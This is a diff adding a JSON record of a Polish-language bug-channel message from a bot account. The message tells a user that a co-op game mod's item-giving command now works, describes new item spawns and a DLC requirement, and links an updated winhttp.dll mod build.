@@ -1,0 +1,13 @@
+{
+ "id": "1569802696423383121",
+ "channel": "błędy",
+ "time": "2026-11-10T19:55:28.351000+00:00",
+ "author": "TLDCoop",
+ "username": "TLDCoop",
+ "author_id": "1568266348587655218",
+ "bot": true,
+ "content": "<@464826282212065282> poprawione. W logu było widać, że wszystkie 25 przedmiotów się wczytało, a nie działało tylko dawanie do plecaka (konsola gry zwracała pustkę). Teraz mod sam daje przedmiot, więc `add GEAR_CargoToolbelt` powinno działać od razu.\nPrzedmioty pojawiają się też w szafkach i skrzynkach w nowych miejscach. Domyślnie trafiają do 3% pojemników, rzadsze rzadziej (szczegóły na #updates).\nUwaga: w twoim logu jest „GEAR_ToolBelt isn't in this game”, czyli ATTACH dla pasów nie zadziała bez zwykłego pasa na narzędzia z DLC Tales. Komenda `add` i spawn działają mimo to.\nNowy dll: https://github.com/cgpt28641-ops/polar-link/releases/download/dll-latest/winhttp.dll\nJak `add` dalej nie da przedmiotu, wyślij coop.log z nowej wersji.",
+ "reply_to": null,
+ "attachments": [],
+ "mentions_bot": false
+}
